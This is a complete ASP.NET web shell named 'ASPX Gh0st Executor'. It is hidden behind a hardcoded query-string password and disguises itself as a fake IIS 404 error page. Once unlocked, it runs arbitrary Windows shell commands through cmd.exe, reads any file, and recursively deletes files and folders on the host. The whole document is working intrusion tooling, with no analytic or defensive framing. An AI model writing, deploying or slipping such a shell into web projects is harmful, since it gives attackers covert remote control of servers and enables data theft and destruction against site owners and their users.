<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
    // yourwebsite.com/cmd.aspx?exec=ghost
    string requiredPassword = "ghost";
    string userPassword = Request.QueryString["exec"];

    if (string.IsNullOrEmpty(userPassword) || userPassword != requiredPassword)
    {
        Response.Write(@"
        <!DOCTYPE html>
        <html>
            <head>
                <title>The resource cannot be found.</title>
                <meta name='viewport' content='width=device-width' />
                <style>
                 body {font-family:'Verdana';font-weight:normal;font-size: .7em;color:black;} 
                 p {font-family:'Verdana';font-weight:normal;color:black;margin-top: -5px}
                 b {font-family:'Verdana';font-weight:bold;color:black;margin-top: -5px}
                 H1 { font-family:'Verdana';font-weight:normal;font-size:18pt;color:red }
                 H2 { font-family:'Verdana';font-weight:normal;font-size:14pt;color:maroon }
                </style>
            </head>

            <body bgcolor='white'>

                <span><H1>Server Error in '/' Application.<hr width=100% size=1 color=silver></H1>
                <h2> <i>The resource cannot be found.</i> </h2></span>

                <font face='Arial, Helvetica, Geneva, SunSans-Regular, sans-serif '>
                <b> Description: </b>HTTP 404. The resource you are looking for (or one of its dependencies) could have been removed, had its name changed, or is temporarily unavailable. &nbsp;Please review the following URL and make sure that it is spelled correctly.
                <br><br>
                <b> Requested URL: </b>" + Request.Url.AbsolutePath + @"<br><br>
                </font>

            </body>
        </html>");
        Response.End();
    }
%>

<!DOCTYPE html>
<html>
<head>
    <title>ASPX Gh0st Executor</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin: 20px; }
        textarea { width: 80%; height: 300px; }
        .error { color: red; font-weight: bold; }
        .success { color: green; font-weight: bold; }
    </style>
</head>
<body>

    <h2>ASPX Gh0st Executor</h2>
    <form method="get">
        <input type="hidden" name="exec" value="<%= Server.HtmlEncode(userPassword) %>">
        <input type="text" name="cmd" placeholder="Enter command..." value="<%= Request.QueryString["cmd"] %>">
        <input type="submit" value="Execute">
    </form>

    <%
        string workingDir = Server.MapPath("~/");

        if (Session["CurrentDirectory"] != null)
        {
            workingDir = Session["CurrentDirectory"].ToString();
        }

        string command = Request.QueryString["cmd"];
        if (!string.IsNullOrEmpty(command))
        {
            try
            {
                if (command.ToLower().StartsWith("dir "))
                {
                    string newDir = command.Substring(4).Trim('"');
                    if (Directory.Exists(newDir))
                    {
                        workingDir = newDir;
                        Session["CurrentDirectory"] = workingDir;
                    }
                }

                // The fix here is so that the E:\Folder With Spaces dir is automatically wrapped in a quote
                if (command.ToLower().StartsWith("dir ") && command.IndexOf('"') == -1)
                {
                    string path = command.Substring(4).Trim();
                    command = $"dir \"{path}\"";
                }

                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + command;
                psi.WorkingDirectory = workingDir;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;

                Process process = new Process();
                process.StartInfo = psi;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(error))
                {
                    Response.Write("<p class='error'>Error: " + Server.HtmlEncode(error) + "</p>");
                }
                else
                {
                    Response.Write("<p class='success'>Command Executed Successfully:</p>");
                }

                Response.Write("<textarea readonly>" + Server.HtmlEncode(output) + "</textarea>");
            }
            catch (Exception ex)
            {
                Response.Write("<p class='error'>Error: " + Server.HtmlEncode(ex.Message) + "</p>");
            }
        }
    %>

    <hr>
    <h2>Delete File / Folder</h2>
    <form method="post">
        <input type="hidden" name="exec" value="<%= Server.HtmlEncode(userPassword) %>">
        <input type="text" name="deleteName" placeholder="Enter file or folder name..." size="50">
        <input type="submit" value="Delete">
    </form>

    <%
        if (Request.HttpMethod == "POST" && !string.IsNullOrEmpty(Request.Form["deleteName"]))
        {
            string nameToDelete = Request.Form["deleteName"];
            string targetPath = Path.Combine(workingDir, nameToDelete);

            try
            {
                if (Directory.Exists(targetPath))
                {
                    Directory.Delete(targetPath, true);
                    Response.Write("<p class='success'>Folder deleted successfully</p>");
                }
                else if (File.Exists(targetPath))
                {
                    File.Delete(targetPath);
                    Response.Write("<p class='success'>File deleted successfully</p>");
                }
                else
                {
                    Response.Write("<p class='error'>File/Folder not found</p>");
                }
            }
            catch (Exception ex)
            {
                Response.Write("<p class='error'>Error deleting: " + Server.HtmlEncode(ex.Message) + "</p>");
            }
        }
    %>

    <hr>
    <h2>Read File</h2>
    <form method="get">
        <input type="hidden" name="exec" value="<%= Server.HtmlEncode(userPassword) %>">
        <input type="text" name="readFile" placeholder="Enter file name..." size="50">
        <input type="submit" value="Read">
    </form>

    <%
        if (!string.IsNullOrEmpty(Request.QueryString["readFile"]))
        {
            string fileToRead = Request.QueryString["readFile"];
            string filePath = Path.Combine(workingDir, fileToRead);

            if (File.Exists(filePath))
            {
                try
                {
                    string content = File.ReadAllText(filePath);
                    Response.Write("<h3>File Content:</h3>");
                    Response.Write("<textarea rows='10' cols='80' readonly>" + Server.HtmlEncode(content) + "</textarea>");
                }
                catch (UnauthorizedAccessException)
                {
                    Response.Write("<p class='error'>Permission Denied</p>");
                }
                catch (Exception ex)
                {
                    Response.Write("<p class='error'>Error reading file</p>");
                }
            }
            else
            {
                Response.Write("<p class='error'>File not found</p>");
            }
        }
    %>

</body>
</html>
